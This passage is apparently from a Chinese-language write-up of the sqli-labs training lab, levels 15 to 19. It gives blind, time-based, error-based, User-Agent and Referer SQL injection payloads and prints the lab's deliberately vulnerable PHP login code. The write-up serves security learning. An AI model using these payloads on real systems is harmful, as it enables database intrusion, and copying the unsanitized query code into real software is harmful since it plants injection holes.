class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>没有回显，考虑盲注和报错</p><p>布尔盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;aaa&#39; or substr((select database()),1,1)&#x3D;&#39;s&#39;%23&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>也可以时间盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;asa&#39; or if((substr((select database()),1,1))&#x3D;&#39;s&#39;,sleep(3),0)%23&amp;passwd&#x3D;dsa&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>报错注入用不了了，发现<code>print_r(mysql_error());</code>删掉了，这样的话sql语句错误也爆不来了</p><h3 id="关键代码-14"><a href="#关键代码-14" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>sql错误爆不出来只能fuzz，最终得到</p><p>布尔盲注：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;aaa&quot;) or substr((select database()),1,1)&#x3D;&#39;s&#39;%23&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>时间盲注：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;aaa&quot;) or if((substr((select database()),1,1))&#x3D;&#39;s&#39;,sleep(3),0)%23&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="关键代码-15"><a href="#关键代码-15" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;？php</span><br><span class="line">$uname=<span class="string">&#x27;&quot;&#x27;</span>.$uname.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$passwd=<span class="string">&#x27;&quot;&#x27;</span>.$passwd.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>接着就是update注入了，对于这种注入，最好的方法感觉就是报错注入了</p><p>猜测后台sql语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> <span class="keyword">password</span>=<span class="string">&#x27;$password&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span></span><br></pre></td></tr></table></figure><p>我们直接报错注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;sadasda&#39; or updatexml(1,concat(0x3a,(select database())),1)%23&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIM截图20200513232359.png" style="zoom:67%;"><p>注意这里uname表里必须有，后面的updatexml才会执行</p><p>还可以时间盲注：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;sadasda&#39; or if(substr((select database()),1,1)&#x3D;&#39;s&#39;,sleep(3),0)%23&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="关键代码-16"><a href="#关键代码-16" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">        $value = stripslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">    &#123;</span><br><span class="line">        $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">$passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;User Name:&#x27;</span>.$uname.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;New Password:&#x27;</span>.$passwd.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">        $row1 = $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        $update=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">        mysql_query($update);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (mysql_error())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>这个是User-Agent insert注入</p><p>sql语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`security`</span>.<span class="string">`uagents`</span> (<span class="string">`uagent`</span>, <span class="string">`ip_address`</span>, <span class="string">`username`</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;$uagent&#x27;</span>, <span class="string">&#x27;$IP&#x27;</span>, $uname)</span><br></pre></td></tr></table></figure><p>报错注入构造：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span>: firefox&#x27; or updatexml(1,concat(0x3a,(select user())),1) or &#x27;</span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIM截图20200513232605.png" style="zoom:80%;"><p>这里的账号密码必须正确</p><p>也可以时间盲注：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span>: firefox&#x27; or if(substr((select database()),1,1)=&#x27;s&#x27;,sleep(3),0) or &#x27;</span><br></pre></td></tr></table></figure><h3 id="关键代码-17"><a href="#关键代码-17" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line">$value = substr($value,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">    $value = stripslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">    &#123;</span><br><span class="line">    $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    $value = intval($value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line">$uagent = $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">$uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">$passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">$fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;User Agent:&#x27;</span>.$uname.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line">$sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">$result1 = mysql_query($sql);</span><br><span class="line">$row1 = mysql_fetch_array($result1);</span><br><span class="line"><span class="keyword">if</span>($row1)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">    $insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line">    mysql_query($insert);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>这个是Referer insert注入，和上一关思路一样</p><p>sql语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`security`</span>.<span class="string">`referers`</span> (<span class="string">`referer`</span>, <span class="string">`ip_address`</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;$refer&#x27;</span>, <span class="string">&#x27;$IP&#x27;</span>)</span><br></pre></td></tr></table></figure><p>报错注入构造：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 1&#x27; or updatexml(1,concat(0x3a,(select user())),1) or &#x27;</span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIM截图20200513233808.png" style="zoom: 67%;"><p>时间盲注构造:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 1&#x27; or if(substr((select database()),1,1)=&#x27;s&#x27;,sleep(3),0) or &#x27;</span><br></pre></td></tr></table></figure><h3 id="关键代码-18"><a href="#关键代码-18" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 